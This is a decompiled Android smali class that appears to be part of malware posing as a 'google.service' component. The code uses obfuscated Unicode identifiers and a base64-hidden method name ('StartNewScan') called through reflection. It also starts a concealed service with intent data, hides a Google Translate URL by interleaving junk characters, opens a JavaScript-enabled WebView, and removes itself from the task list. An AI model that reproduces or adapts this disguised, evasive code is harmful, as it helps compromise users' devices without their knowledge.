.class public Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;
.super Landroid/app/Activity;
.source "\u03b8\u3164\u02bf\u02bb\u3164\u2db1\u03c6\u1d35\u02bb\u02cb\u02cf$\u1d47\u02bf$\u2db1\u02cb\u2db1\u0999\u2db1\u02bb\u3164\u1d35\u4240\u2db14792.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$HelloWebViewClient;
    }
.end annotation


# instance fields
.field private final abcd:Landroid/content/BroadcastReceiver;

.field private needed:Z

.field wb:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 18
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    .line 32
    iput-boolean v0, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->needed:Z

    .line 42
    new-instance v0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$1;

    invoke-direct {v0, p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$1;-><init>(Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;)V

    iput-object v0, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->abcd:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method public static LOGIT(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    const-string v0, "splash.app.\u4240\u03c6\u20ab\u05d9\u2db1\u02c9\u02c8\u02cb\u03c6\u02be\ufe73$\u02c9\u3164\u1d62$\u02cb\u02bf\u02be$\u1d54\u4240\u02bf$\u05d9\u02bf\u3164$$\u1d35\u02cb4774"

    const/4 v1, 0x0

    .line 157
    :try_start_0
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object v0, v1

    .line 165
    :goto_0
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/InstantiationException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-object v2, v1

    :goto_1
    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    .line 173
    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    .line 174
    const-class v5, Landroid/content/Intent;

    const/4 v7, 0x1

    aput-object v5, v4, v7

    const-string v5, "U3RhcnROZXdTY2Fu"

    .line 175
    invoke-static {v5}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->iTMfwUrRZRqyQhfBUmxtDp4809(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 179
    :try_start_2
    invoke-virtual {v0, v5, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :try_start_3
    new-array v0, v3, [Ljava/lang/Object;

    aput-object p0, v0, v6

    aput-object p1, v0, v7

    .line 185
    invoke-virtual {v1, v2, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    .line 196
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 197
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 200
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    .line 52
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 54
    invoke-virtual {p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const/4 v0, 0x0

    :try_start_0
    const-string v1, "key"

    .line 57
    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object p1, v0

    :goto_0
    const/4 v1, 0x1

    if-eqz p1, :cond_1

    .line 62
    invoke-virtual {p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 63
    const-class v2, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;

    invoke-static {v2, v0}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 66
    iget-object v2, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->abcd:Landroid/content/BroadcastReceiver;

    new-instance v3, Landroid/content/IntentFilter;

    const-string v4, "xyz"

    invoke-direct {v3, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v2, v3}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 67
    iput-boolean v1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->needed:Z

    .line 69
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lgoogle/service/ⶱᵇʿˉՙ䉀ˉⶱʻˉʻ$ᴵᵎθﹳ䉀ⶱˈⶱ䉀$4777;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 70
    sget-object v2, Lgoogle/service/䉀ㅤ$ʾᴵⶱՙˎʾθʿ䉀φיʼʿʾ䉀ᵢᴵ䉀ﹶʾ₫ˎﹶⶱˋᴵᘣᵎ$4778;->FTX1:Ljava/lang/String;

    invoke-virtual {v1, v2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 71
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 75
    :cond_0
    invoke-virtual {p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->finish()V

    goto/16 :goto_3

    .line 78
    :cond_1
    sget-boolean p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;->FORCA:Z

    if-nez p1, :cond_2

    sget-boolean p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;->FORSC:Z

    if-nez p1, :cond_2

    const p1, 0x7f07000a

    .line 80
    invoke-virtual {p0, p1}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->setContentView(I)V

    const p1, 0x7f050046

    .line 81
    invoke-virtual {p0, p1}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/webkit/WebView;

    iput-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    .line 82
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 83
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 84
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 85
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v2, 0x0

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 86
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v3, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v3}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 88
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    new-instance v3, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$HelloWebViewClient;

    invoke-direct {v3, p0, v0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$HelloWebViewClient;-><init>(Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792$1;)V

    invoke-virtual {p1, v3}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 89
    iget-object p1, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->wb:Landroid/webkit/WebView;

    const-string v3, "ht\u03b8\u03c6tps://tra\u03b8\u03c6nslate.goo\u03b8\u03c6gle.c\u03b8\u03c6om"

    const-string v4, "\u03b8\u03c6"

    invoke-static {v3, v4}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->TMUMiSoocRSkkppSFDgkVtB4817(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 91
    invoke-virtual {p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 96
    const-class v3, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-static {v3, p1}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 97
    new-instance v3, Landroid/content/Intent;

    const-class v4, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;

    invoke-direct {v3, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "splash.app.\u4240\u03c6\u20ab\u05d9\u2db1\u02c9\u02c8\u02cb\u03c6\u02be\ufe73$\u02c9\u3164\u1d62$\u02cb\u02bf\u02be$\u1d54\u4240\u02bf$\u05d9\u02bf\u3164$$\u1d35\u02cb4774"

    .line 103
    :try_start_1
    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-object v4, v0

    .line 111
    :goto_1
    :try_start_2
    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v5
    :try_end_2
    .catch Ljava/lang/IllegalAccessException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/InstantiationException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-object v5, v0

    :goto_2
    const/4 v6, 0x2

    new-array v7, v6, [Ljava/lang/Class;

    .line 119
    const-class v8, Landroid/content/Context;

    aput-object v8, v7, v2

    .line 120
    const-class v8, Landroid/content/Intent;

    aput-object v8, v7, v1

    const-string v8, "U3RhcnROZXdTY2Fu"

    .line 121
    invoke-static {v8}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->iTMfwUrRZRqyQhfBUmxtDp4809(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 125
    :try_start_3
    invoke-virtual {v4, v8, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0
    :try_end_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    :try_start_4
    new-array v4, v6, [Ljava/lang/Object;

    aput-object p1, v4, v2

    aput-object v3, v4, v1

    .line 131
    invoke-virtual {v0, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/IllegalAccessException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_3

    .line 142
    :cond_2
    invoke-virtual {p0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->finish()V

    :catch_4
    :cond_3
    :goto_3
    return-void
.end method

.method protected onDestroy()V
    .locals 1

    .line 35
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 36
    iget-boolean v0, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->needed:Z

    if-eqz v0, :cond_0

    .line 38
    iget-object v0, p0, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->abcd:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lgoogle/service/θㅤʿʻㅤⶱφᴵʻˋˏ$ᵇʿ$ⶱˋⶱঙⶱʻㅤᴵ䉀ⶱ4792;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_0
    return-void
.end method
